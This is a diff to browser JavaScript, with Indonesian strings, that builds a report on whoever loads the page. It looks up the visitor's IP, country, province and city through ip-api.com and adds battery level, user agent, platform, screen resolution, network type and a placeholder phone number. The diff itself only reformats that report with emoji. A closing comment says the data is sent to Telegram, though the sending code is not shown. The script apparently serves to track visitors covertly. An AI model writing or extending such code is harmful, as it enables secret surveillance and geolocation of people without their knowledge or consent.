@@ -70,43 +70,33 @@
         const networkType = connection ? connection.effectiveType : "Tidak diketahui";
         const battery = navigator.getBattery ? await navigator.getBattery() : null;
         const batteryInfo = battery 
-            ? `Baterai: ${Math.round(battery.level * 100)}%, Pengisian: ${battery.charging ? "Ya" : "Tidak"}`
-            : "Informasi baterai tidak tersedia";
+            ? `🔋 Baterai: ${Math.round(battery.level * 100)}%, Pengisian: ${battery.charging ? "Ya" : "Tidak"}`
+            : "🔋 Informasi baterai tidak tersedia";
 
-        let locationInfo = "Gagal mendapatkan lokasi.";
-        let phoneNumber = "Nomor telepon tidak tersedia.";
+        let locationInfo = "📍 Gagal mendapatkan lokasi.";
+        let phoneNumber = "📞 Nomor telepon tidak tersedia.";
         try {
             const response = await fetch("http://ip-api.com/json/");
             const data = await response.json();
             locationInfo = `
 
-🌍 Info Pengguna
+🌍 Informasi Pengguna
 
-IP: ${data.query}
+🌐 IP: ${data.query}
 
-Negara: ${data.country}
+🏳️ Negara: ${data.country}
 
-Provinsi: ${data.regionName}
+🏙️ Provinsi: ${data.regionName}
 
-Kota: ${data.city}
-
-${batteryInfo}
-
-User Agent: ${userAgent}
-
-Platform: ${platform}
-
-Resolusi Layar: ${screenResolution}
-
-Jenis Jaringan: ${networkType}`;
+📍 Kota: ${data.city}`;
 
 // Mendapatkan nomor telepon jika tersedia (simulasi karena keterbatasan browser API)
-          phoneNumber = "+62xxxxxxxx"; // Ganti dengan metode lain untuk mendapatkan nomor telepon jika diperlukan.
+          phoneNumber = `📞 Nomor Telepon: +62xxxxxxxx`; // Ganti dengan metode lain untuk mendapatkan nomor telepon jika diperlukan.
       } catch (error) {
           console.error("Gagal mendapatkan lokasi:", error);
       }
 
-      return `${locationInfo}\n- Nomor Telepon: ${phoneNumber}`;
+      return `${locationInfo}\n${batteryInfo}\n📱 User Agent: ${userAgent}\n💻 Platform: ${platform}\n🖥️ Resolusi Layar: ${screenResolution}\n📡 Jenis Jaringan: ${networkType}\n${phoneNumber}`;
   }
 
   // Mengirimkan data ke Telegram
